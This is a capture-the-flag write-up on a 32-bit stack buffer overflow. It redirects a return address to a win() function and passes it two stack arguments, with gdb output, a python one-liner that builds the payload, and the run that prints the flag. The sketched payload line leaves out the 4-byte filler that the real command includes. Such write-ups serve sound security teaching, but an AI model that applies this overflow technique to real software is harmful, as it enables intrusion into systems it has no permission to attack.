> Source file: `vuln.c`

> Executable: `vuln`
---

Here, our goal would to modify the `retAddr` to `win()` function instead of `main()` functions instructions.

But to get `flag` printed in console, we have to satishfy 2 conditions which are:
`arg1` should be `0xCAFEF00D` &
`arg2` should be `0xF00DF00D`

So, we have to call the `win()` function with 2 arguments.

Lets see how we can achieve that. See below image.

![Diagram](https://github.com/user-attachments/assets/1832bf43-312a-4877-ae3d-edc12e6d414f)

Here, we have to alter the `retAddr` and also have to place the `function arguments` on the stack. 

To find address of win(), we can use `gdb`.
```
gef➤  p win 
$2 = {<text variable, no debug info>} 0x8049296 <win>
```

#### Payload creation:
```
payload => 'A'*100 + 'B'*8 + 'C'*4 + 'retAddr to win()' + 'argument1' + 'argument2'
payload => 'A'*100 + 'B'*8 + 'C'*4 + '0x08049296' + '0xcafef00d' + '0xf00df00d'
```
Lets save this payload to file `payload.txt`.
```
# python3 -c "import sys; sys.stdout.buffer.write(b'A'*100 + b'B'*8 + b'C'*4 + b'\x96\x92\x04\x08' + b'D'*4 + b'\x0d\xf0\xfe\xca' + b'\x0d\xf0\x0d\xf0')" > payload.txt
```

Time for exploit!
```
# ./vuln < payload.txt 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAABBBBBBBBCCCC�DDDD
flag{WinayGupta777}Segmentation fault
```
Although we got the `Segmentation fault`, we can see `flag` printed on the console. This `Seg Fault` is because not proper exit of function!


